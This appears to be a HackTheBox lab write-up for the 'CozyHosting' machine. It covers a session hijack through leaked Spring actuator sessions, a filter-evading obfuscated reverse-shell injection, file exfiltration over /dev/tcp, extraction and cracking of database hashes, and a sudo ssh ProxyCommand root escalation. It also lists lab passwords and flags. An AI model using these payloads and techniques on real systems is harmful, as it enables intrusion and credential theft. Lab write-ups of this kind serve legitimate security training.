---
render_with_liquid: false
title: HackTheBox Writeup  CozyHosting
date: 2023-09-03 19:38:53 +1400
tags: [hackthebox, nmap, linux, discover-secrets, cookie-tamper, command-injection-bypass, java, discover-secrets, psql, hashcat, sudo, gtfobin, oscp-like-2023]
---




# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Sun Sep  3 19:38:53 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 cozyhosting.htb
Nmap scan report for cozyhosting.htb (10.129.67.19)
Host is up, received user-set (0.11s latency).
Scanned at 2023-09-03 19:38:53 CST for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Sep  3 19:39:05 2023 -- 1 IP address (1 host up) scanned in 12.32 seconds
```

## 80 - Site : Cozy Hosting

### Info

![](/assets/obsidian/879068830750ff9a8ee7f6a37fd81f3d.png)

![](/assets/obsidian/bc5a194c923628b45ec77a7d85f7eada.png)

### Directory

```bash
feroxbuster -t 200 -o ferox_80.txt --thorough -u http://cozyhosting.htb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ cat ferox_80.txt| grep -v '400\|404\|/assets/'
500      GET        1l        1w       73c http://cozyhosting.htb/error
204      GET        0l        0w        0c http://cozyhosting.htb/logout
200      GET       97l      196w     4431c http://cozyhosting.htb/login
401      GET        1l        1w       97c http://cozyhosting.htb/admin
200      GET      285l      745w    12706c http://cozyhosting.htb/index
200      GET      285l      745w    12706c http://cozyhosting.htb/
```


# User Flag
---


## Shell as app

### leaked cookie

By googling a 404 error page, found out it's a Spring Boot app

![](/assets/obsidian/5d2ec78ecc79affc42de387dc17de685.png)

![](/assets/obsidian/91a223fb3c9bf4a6feeeae80606d7f72.png)

There's an interesting api endpoint 

> http://cozyhosting.htb/actuator/mappings

![](/assets/obsidian/1e23f3949df5613be8a969fcf9301b40.png)

Enumerate possible endpoints under `/actuator/`

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators

```bash
┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ feroxbuster -t 150 -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -C 404 --dont-extract-links

...
200      GET      285l      745w    12706c http://cozyhosting.htb/
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l        1w       95c http://cozyhosting.htb/actuator/sessions
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
[####################] - 5s       113/113     0s      found:9       errors:0
[####################] - 4s       113/113     27/s    http://cozyhosting.htb/ 
```

All values under `/actuator/env/` were censored

![](/assets/obsidian/dc94eaa919627f703b04fb0a531985d0.png)

> `http://cozyhosting.htb/actuator/sessions`

They key looks like a `JSESSIONID`

![](/assets/obsidian/5c17f16eaed4516e6b96ce3adc118701.png)

### Tamper Cookies

Visit home page and tamper cookie via `Cookie Editor`

![](/assets/obsidian/06d22fb73448c99a3f6689efa04095a3.png)

After refreshing, the login button vanished

![](/assets/obsidian/eb1548ab7fdd7ac5d9951bdbef319de3.png)

Now we have access to admin dashboard

> http://cozyhosting.htb/admin

![](/assets/obsidian/823b4a85f66c2e82325253f14c304e0d.png)

### Command injection in /executessh

Based on the function purpose, assumed it might be vulnerable to command injection

![](/assets/obsidian/d267e996126049c17ed1c0750d19ab70.png)

If I don't provide a username, it will reveal the ssh command's help message

![](/assets/obsidian/09301df0873c33a40fccb878426e5937.png)

Confirm command injection by adding `;sleep 5;`

![](/assets/obsidian/c5efe1077b75f21680db06274bb62e49.png)

It does not allow spaces

![](/assets/obsidian/ea372d9c1683eabe921bf5177d0d57c6.png)

Craft `${IFS}` reverse shell payload to bypass white space check

```bash
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.23/1111 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

```bash
echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eU15OHhNVEV4SURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

![](/assets/obsidian/b2323d671a64d2ecf5538e6e094b4eb9.png)

```bash
nc -lvnp 1111
```

```bash
listening on [any] 1111 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.80.71] 59646
bash: cannot set terminal process group (997): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
```

## From app to josh

### psql credential in jar file

Stabilize shell

```bash
app@cozyhosting:/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
app@cozyhosting:/app$ ^Z
zsh: suspended  python3 /opt/sectools/c2/EzpzShell/ezpzShell.py 10.10.14.23 1111 bash

┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ stty raw -echo;fg
[1]  + continued  python3 /opt/sectools/c2/EzpzShell/ezpzShell.py 10.10.14.23 1111 bash

app@cozyhosting:/app$ export TERM=xterm
app@cozyhosting:/app$
```

Check users

```bash
app@cozyhosting:/app$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```

Find items owned by `app`

```bash
app@cozyhosting:/app$ find / -user $USER -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
/tmp/hsperfdata_app
/tmp/hsperfdata_app/997
/tmp/tomcat-docbase.8080.11682194487850189346
/tmp/tomcat.8080.15815918135502622134
/tmp/tomcat.8080.15815918135502622134/work
/tmp/tomcat.8080.15815918135502622134/work/Tomcat
/tmp/tomcat.8080.15815918135502622134/work/Tomcat/localhost
/tmp/tomcat.8080.15815918135502622134/work/Tomcat/localhost/ROOT
```

A jar file is serving at port `8080` and proxied to `80` via nginx

```bash
app@cozyhosting:/app$ ls -latr
total 58856
-rw-r--r--  1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar
drwxr-xr-x 19 root root     4096 Aug 14 14:11 ..
drwxr-xr-x  2 root root     4096 Aug 14 14:11 .

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      997/java
tcp6       0      0 :::22                   :::*                    LISTEN      -

app@cozyhosting:/app$ ps auxf|grep 997 -E3
root         851  0.0  0.1  15512  7416 ?        Ss   04:36   0:00 /lib/systemd/systemd-logind
root         853  0.0  0.3 392520 12816 ?        Ssl  04:36   0:00 /usr/libexec/udisks2/udisksd
root         873  0.0  0.3 317960 12256 ?        Ssl  04:36   0:00 /usr/sbin/ModemManager
app          997  0.5  7.6 3634764 306156 ?      Ssl  04:36   1:43 /usr/bin/java -jar cloudhosting-0.0.1.jar
root        1000  0.0  0.0   6892  3036 ?        Ss   04:36   0:00 /usr/sbin/cron -f -P
root        1017  0.0  0.2  15420  9244 ?        Ss   04:36   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        3021  0.0  0.2  17172 10848 ?        Ss   09:23   0:00  \_ sshd: josh [priv]
--
app         3258  0.0  0.0   2888   972 pts/2    S    09:29   0:00              \_ -sh
app         3262  0.0  0.1   7632  4224 pts/2    S    09:29   0:00                  \_ bash
app         3338  0.0  0.0  10404  3772 pts/2    R+   09:34   0:00                      \_ ps auxf
app         3339  0.0  0.0   6476  2284 pts/2    S+   09:34   0:00                      \_ grep 997 -E3
root        1025  0.0  0.0  55208  1680 ?        Ss   04:36   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1027  0.0  0.1  56260  6656 ?        S    04:36   0:00  \_ nginx: worker process
www-data    1028  0.0  0.1  55988  6340 ?        S    04:36   0:00  \_ nginx: worker process

app@cozyhosting:/app$ cat /etc/nginx/sites-enabled/default
server {
        listen 80;
        return 301 http://cozyhosting.htb;
}
server {
        listen 80;
        server_name cozyhosting.htb;
        location / {
                proxy_pass http://localhost:8080;
        }
}
```

Transfer the jar file back to our host

```bash
┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ nc -lvnp 443 > cloudhosting-0.0.1.jar
listening on [any] 443 ...
```

I noticed that my current shell wasn't **bash**, the `/dev/tcp/` redirector needs **bash** to work

```bash
app@cozyhosting:/app$ echo $SHELL
/bin/sh
app@cozyhosting:/app$ bash -c 'cat cloudhosting-0.0.1.jar > /dev/tcp/10.10.14.34/443'
```

Extract the jar file

```bash
┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ mkdir cloudhosting

┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ mv cloudhosting-0.0.1.jar cloudhosting

┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ cd cloudhosting

┌──(bravosec㉿fsociety)-[~/htb/CozyHosting/cloudhosting]
└─$ tar -xvf cloudhosting-0.0.1.jar
```

Search for password string and found credential for `postgres`

```bash
┌──(bravosec㉿fsociety)-[~/htb/CozyHosting/cloudhosting]
└─$ grep -rin passw
...
BOOT-INF/classes/application.properties:12:spring.datasource.password=Vg&nvzAQ7XxR
```

```bash
vi BOOT-INF/classes/application.properties
```

```bash
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

### Admin's credential in psql database

List databases

```bash
app@cozyhosting:/tmp/hsperfdata_app$ psql -h localhost -U postgres
Password for user postgres:Vg&nvzAQ7XxR

postgres=# \l+
```

```bash
                                     List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   |  Size   | Tablespace |                Description
-------------+----------+----------+-------------+-------------+-----------------------+---------+------------+--------------------------------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |                       | 8737 kB | pg_default |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |                       | 8553 kB | pg_default | default administrative connection database
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +| 8401 kB | pg_default | unmodifiable empty database
             |          |          |             |             | postgres=CTc/postgres |         |            |
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +| 8553 kB | pg_default | default template for new databases
             |          |          |             |             | postgres=CTc/postgres |         |            |
(4 rows)
```

Use the database : `cozyhosting`

```bash
postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
```

List tables

```bash
cozyhosting=# \dt+
```

```bash
                                     List of relations
 Schema | Name  | Type  |  Owner   | Persistence | Access method |    Size    | Description
--------+-------+-------+----------+-------------+---------------+------------+-------------
 public | hosts | table | postgres | permanent   | heap          | 8192 bytes |
 public | users | table | postgres | permanent   | heap          | 8192 bytes |
(2 rows)
```

Retrieve data from the table : `users`

```bash
cozyhosting=# select * from users;
```

```bash
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```


### Crack the hashes from users table

It's `bcrypt`

```bash
┌──(bravosec㉿fsociety)-[~/htb/CozyHosting/loot]
└─$ nth -t '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
...
Most Likely
bcrypt, HC: 3200 JtR: bcrypt
Blowfish(OpenBSD), HC: 3200 JtR: bcrypt Summary: Can be used in Linux Shadow Files.
Woltlab Burning Board 4.x,
```

Select them as a format for hashcat

```bash
cozyhosting=# select name||':'||password from users;
```

```bash
kanderson:$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/CozyHosting]
└─$ mkdir loot && cd loot

┌──(bravosec㉿fsociety)-[~/htb/CozyHosting/loot]
└─$ vi users.hash

┌──(bravosec㉿fsociety)-[~/htb/CozyHosting/loot]
└─$ cp users.hash /media/sf_kali-share
```

```bash
hashcat D:\kali-share\users.hash "D:\kali-share\rockyou.txt" --user -m 3200
```

Result : 

```bash
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

Password reuse

```bash
app@cozyhosting:/app$ su - josh
Password:manchesterunited
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$ cat user.txt
67aea6149c2981ab37704fc5839cd071
```

# Root Flag
---

## From josh to root

Simple `gtfobin`

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

> https://gtfobins.github.io/gtfobins/ssh/#sudo

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
b072647f1011c4752e2a7ec4d7327da6
```

# Additional
---

## Failed Attempts


### Brute Force login

![](/assets/obsidian/f1a3c807aae8780d1f129ca6766ecb17.png)

```bash
ffuf -c -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ1 -w /usr/share/seclists/Passwords/darkweb2017-top100.txt:FUZZ2 -request login.req -request-proto http -fs 0
```